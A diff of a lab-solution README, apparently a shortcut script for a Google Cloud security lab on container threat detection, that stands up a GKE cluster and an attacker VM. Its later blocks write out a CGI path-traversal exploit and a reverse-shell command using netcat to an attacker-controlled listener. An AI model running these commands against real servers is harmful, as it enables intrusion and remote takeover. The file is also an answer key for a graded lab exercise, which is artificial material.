@@ -1,12 +1,9 @@
 # GSP1125
 >🚨 [PLEASE SUBSCRIBE OUR CHANNEL CLOUDHUSTLER](https://www.youtube.com/@cloudhustlers) **&** [JOIN OUR COMMUNITY](https://chat.whatsapp.com/FilXyp4eva599SND76fNUP)
 ## Run in cloudshell
-> Navigation menu > APIs & Services > Enable APIs & Services > `Security Command Center API` > Enable <br>
 > IAM & ADMIN > Audit Logs > `Cloud Resource Manager API` > Admin Read > Save
 ```cmd
-export ZONE=
-```
-```cmd
+export ZONE=us-central1-c
 REGION=${ZONE::-2}
 gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:demouser1@gmail.com --role=roles/bigquery.admin
@@ -43,19 +40,19 @@ gcloud compute networks subnets update default \
 sleep 30
 gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet
 ```
+![image](https://github.com/CloudHustlers/LEVEL_2_OCT/assets/88576711/938b472e-9562-4249-bd03-cde85b9a25d5)
+### IP is in TASK 5, STEP 5 (NOTE)
 ```cmd
-export ZONE=
+TASK_5_IP=
 ```
 ```cmd
+export ZONE=us-central1-c
 sudo snap remove google-cloud-cli
 curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz
 tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz
 ./google-cloud-sdk/install.sh
 ```
 > Press N > Press y
-```cmd
-export IP_ADDRESS=""
-```
 ```cmd
 . ~/.bashrc
 gcloud components install kubectl gke-gcloud-auth-plugin --quiet
@@ -67,13 +64,19 @@ gcloud container clusters create test-cluster \
 --num-nodes=1 \
 --master-ipv4-cidr "172.16.0.0/28" \
 --enable-master-authorized-networks \
---master-authorized-networks $IP_ADDRESS
+--master-authorized-networks "$TASK_5_IP"
 sleep 30
-kubectl describe daemonsets container-watcher -n kube-system
-sleep 5
-kubectl describe daemonsets container-watcher -n kube-system
-sleep 2
-kubectl describe daemonsets container-watcher -n kube-system
+while true; do
+    output=$(kubectl describe daemonsets container-watcher -n kube-system)
+    if [[ $output == *container-watcher-unique-id* ]]; then
+        echo "Found unique ID in the output:"
+        echo "$output"
+        break
+    else
+        echo "SUBSCRIBE CLOUDHUSTLERS AND Comment on Video / Wait for sometime"
+        sleep 10
+    fi
+done
 ```
 ```cmd
 kubectl create deployment apache-deployment \
@@ -152,18 +155,10 @@ curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
 ```
 ### Open new terminal
 ```cmd
-export ZONE=
-```
-```cmd
+export ZONE=us-central1-c
 gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet --command "nc -nlvp 8888"
 ```
 ### In first terminal 
 ```cmd
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash"
-```
-```cmd
-curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
---path-as-is \
---insecure \
---data "echo Content-Type: text/plain; echo; /tmp/nc"
 ```
